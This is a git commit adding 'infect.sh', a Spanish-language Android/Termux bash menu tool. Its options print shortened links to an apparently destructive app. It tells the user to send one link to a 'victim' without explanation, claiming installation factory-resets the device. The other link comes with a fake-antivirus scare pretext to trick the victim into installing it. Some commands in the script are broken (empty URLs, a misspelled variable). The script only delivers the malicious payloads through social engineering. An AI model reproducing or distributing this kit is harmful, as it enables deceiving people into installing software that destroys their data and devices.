34a4b033fcc1ca533166dc36337ddbeb46e4eaba
Anti-Plague <86685759+Anti-Plague@users.noreply.github.com>
2021-06-30 00:06:10 -0300

    Add files via upload

---
+++ infect.sh
@@ -0,0 +1,292 @@
+# A tool by nitro from www.noob-hackers.com
+# Be a unique person not copy cat
+# Colours
+#-----------------
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+#-----------------
+# scripting start
+banner(){
+vid
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   ANTI PLAGUE  @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+                        Anti Plague
+'
+echo " " 
+echo -e "$red                       ▶Codeado by$grn Secret$red◀$rset"
+echo -e "$red                      ⫸$ylo  AP Legion$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [No nos hacemos responsbale]$rset"
+echo " "
+echo " "
+}
+baner1(){
+clear
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   ANTI PLAGUE  @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+                        Anti Plague
+'
+echo " " 
+echo -e "$red                       ▶Codeado by$grn Secret$red◀$rset"
+echo -e "$red                        ⫸$ylo  AP Legion$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [No nos hacemos responsables]$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$grn             ＞＞＞＞>>>＞$ylo [Opciones]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infectar ahora"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Guardar ahora"
+
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Más"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Salir"
+echo " "
+echo " "
+echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECCIONAR OPCIÓN\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+am start -a android.intent.action.VIEW -d https:// > /dev/null 2>&1
+banner
+menu
+
+menu
+elif [ $optnz = "4" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+################
+clear
+echo
+echo -e '\e[92m 
+  _   _  ____ _______       
+ | \ | |/ __ \__   __|/\    
+ |  \| | |  | | | |  /  \   
+ | . ` | |  | | | | / /\ \  
+ | |\  | |__| | | |/ ____ \ 
+ |_| \_|\____/  |_/_/    \_\
+                            
+                            '
+echo " "
+echo -e "\e[91m 😈 Copie el enlace a continuación y envíelo a su víctima y
+no le digas nada. cuando lo instala en su
+dispositivo se restablecerá de fábrica y sucederá mucho más.
+                                👇👇👇
+
+         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+
+                                 👆👆👆
+Úselo solo para fines buenos, no para dañar a alguien que no hico nada😇✌️.
+Y nuestro canal no se hace responsable de ningún tipo de pérdida.
+haces a otros por este script."
+echo
+echo -ne "\e[92m#Escriba exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+  _   _  ____ _______       
+ | \ | |/ __ \__   __|/\    
+ |  \| | |  | | | |  /  \   
+ | . ` | |  | | | | / /\ \  
+ | |\  | |__| | | |/ ____ \ 
+ |_| \_|\____/  |_/_/    \_\
+                            
+                            '
+echo " "
+echo " "
+echo -e "\e[93m  Copie el enlace de abajo y envíelo a su víctima y dígale
+que debe instalar esta aplicación o su
+el dispositivo no se recuperará.(Antivirus)
+                    👇👇👇
+
+        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+
+                    👆👆👆
+
+Úselo solo para fines divertidos, no para dañar a alguien 😇✌️.
+Y nuestro canal no se hace responsable de ningún tipo de
+pérdida que haces a los demás por este script."
+echo
+echo -ne "\e[92m#Escriba exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+         ──▐─▌──▐─▌──
+         ─▐▌─▐▌▐▌─▐▌─
+         ─█▄▀▄██▄▀▄█─
+         ──▄──██▌─▄──
+         ▄▀─█▀██▀█─▀▄
+         ▐▌▐▌─▐▌─▐▌▐▌
+         ─▐─█────█─▌─
+         ────▌──▐────
+'
+echo -e "\e[93m                  \e[92mAP" | pv -qL 10
+echo -e "\e[93m             IAM FROM \e[92mAP LEGION" | pv -qL 10
+echo -e "\e[93m       IM A \e[92mGEEK\e[93m " | pv -qL 10
+echo -e "\e[93m             ESPERO QUE LE GUSTE ESTE GUIÓN" | pv -qL 10
+echo -e "\e[93m         OOPS ... HABLO MUCHO SRY PARA ESO " | pv -qL 10
+echo -e "\e[93m             \e[92mWHATS' APP" | pv -qL 10
+echo -e "\e[93m       Discord: \e[92m discord.gg/antiplague\e[0m" | pv -qL 10
+echo -e "\e[92m                CHAU.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/infect" ];
+then
+cd $HOME
+rm -rf infect
+elif [ -d "$HOME/Infect" ];
+then
+cd $HOME
+rm -rf Infect
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mACTUALIZACIÓN ESTÁ EN MARCHA, POR FAVOR ESPERE UN MOMENTO ...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone  2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           ACTUALIZAR SUCCESSFULL (ÚLTIMA VERSIÓN) ..!\e[0m"
+sleep 2.0
+cd $HOME
+cd infect
+bash infect.sh
+}
+vid(){
+FILE=$HOME/infect/noob.noob
+if [ -f "$FILE" ]; then
+pop
+else
+echo
+fi
+}
+pop(){
+clear
+echo -e "\e[96m                \e[0m"
+echo -e "\e[96m                  \e[93m \e[96m    discord.gg/antiplague   \e[0m"
+echo -e "\e[96m                          AP LEGION    \e[0m"
+echo -e "\e[96m                                                   \e[0m"
+echo -e "\e[96m                        Select \e[92my\e[96m to watch\e[96m          \e[0m"
+echo -e "\e[96m                               (\e[93mOR\e[96m)               \e[96m\e[0m"
+echo -e "\e[96m                        Select \e[91mt\e[96m to cancel\e[96m         \e[0m"
+echo -e "\e[96m                                (\e[93mOR\e[96m)               \e[96m\e[0m"
+echo -e "\e[96m                     Select \e[91mz\e[96m to skipforever\e[96m       \e[0m"
+echo -e "\e[96m                \e[0m"
+echo -en "\e[32mSELECCIONAR OPCIÓN [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
+read p
+if [ "$p" = "y" ];
+then
+am start -a android.intent.action.VIEW -d  2>/dev/null
+clear
+baner1
+menu
+elif [ "$p" = "t" ];
+then
+clear
+baner1
+menu
+elif [ "$p" = "z" ];
+then
+cd $HOM/infect
+rm noob.noob
+banner
+menu
+else
+banner
+menu
+exit
+fi
+}
+banner
+menu
